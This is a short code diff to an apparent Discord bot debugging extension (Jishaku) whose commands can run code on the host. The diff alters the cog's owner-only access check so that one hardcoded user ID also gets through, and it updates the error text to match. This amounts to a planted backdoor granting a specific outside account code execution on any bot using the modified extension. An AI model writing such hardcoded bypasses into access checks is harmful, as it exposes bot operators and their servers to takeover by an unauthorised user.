@@ -213,8 +213,10 @@ class Feature(commands.Cog):
         Local check, makes all commands in resulting cogs owner-only
         """
 
-        if not await ctx.bot.is_owner(ctx.author):
-            raise commands.NotOwner("You must own this bot to use Jishaku.")
+        # Allow specific user ID even if not owner
+        rex = 1389611651409645618
+        if not (await ctx.bot.is_owner(ctx.author) or ctx.author.id == rex):
+            raise commands.NotOwner("You must own this bot or be an allowed user to use Jishaku.")
         return True
 
     @contextlib.contextmanager
